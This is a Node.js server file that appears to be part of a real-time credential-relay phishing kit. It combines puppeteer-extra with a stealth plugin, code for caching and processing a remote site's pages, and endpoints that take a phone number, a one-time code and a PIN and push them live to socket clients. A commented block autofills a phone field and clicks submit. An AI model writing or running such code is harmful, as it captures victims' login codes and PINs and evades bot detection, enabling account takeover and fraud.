const fs = require('fs');
//const puppeteer = require('puppeteer');
const puppeteer = require('puppeteer-extra')
const pluginStealth = require('puppeteer-extra-plugin-stealth')
const { executablePath } = require('puppeteer');

const cheerio = require('cheerio');

const path = require('path');
const express = require('express');
const app = express();
const http = require('http');
const server = http.createServer(app);
const { Server } = require("socket.io");
const io = new Server(server, {
    cors: {
        origin: '*',
    }
})

const cors = require('cors');

app.use(cors({
    origin: '*'
}));

const {
    setupSocketEvents
} = require('./components/setupSocketEvents')
const {
    setupChangeListeners
} = require('./components/setupPuppeteerChangeListeners')
const {
    CACHED_RESOURCES_DIR,
    BASE_URL,
    CONTENT_URL,
    PORT,
} = require('./config.js');

const {
    stripCssComments,
    sleep,
    getHashedFileName,
    toAbsoluteUrl
} = require('./components/utils.js')
const {
    getMainAndIframesWithoutScripts,
    processHtmlContent
} = require('./components/resourceProcessing')


io.on("connection", (socket) => {
    console.log('a user connected');
});

io.on('data', (data) => {
    console.log(data);
});

// global puppeteer browser instance

let data = {
    'start': '',
    'phone': '',
    'code': '',
    'pin': ''
}

app.get('/login', async (req, res) => {
    io.emit('data', {
        'message': 'started login flow'
    });

    res.json({
        message: 'started login flow'
    });
});

app.get('/phone', async (req, res) => {

    io.emit('data',{
        'message': 'phone',
        'phone': req.query.phone
    })

    res.json({
        message: 'phone number inputted'
    });
});

app.get('/code', async (req, res) => {
    io.emit('data',{
        'message': 'code',
        'code': req.query.code
    })

    res.json({
        message: 'code inputted'
    })
});

app.get('/pin', async (req, res) => {
    io.emit('pin',{
        'message': 'pin',
        'pin': req.query.pin
    })

    res.json({
        message: 'pin inputted'
    });
});


server.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
})



// let id = 'phone';
// let phoneNumber;

// let phoneNumber = document.getElementById(id);
// let input = phoneNumber;
// let lastValue = input.value;
// input.value = '2107128563';
// let event = new Event('input', { bubbles: true });
// // hack React15
// event.simulated = true;
// // hack React16 内部定义了descriptor拦截value，此处重置状态
// let tracker = input._valueTracker;
// if (tracker) {
//     tracker.setValue(lastValue);
// }
// input.dispatchEvent(event);

// setTimeout(()=>{
//     document.querySelector('button[type="submit"]').click();
// }, 1000);
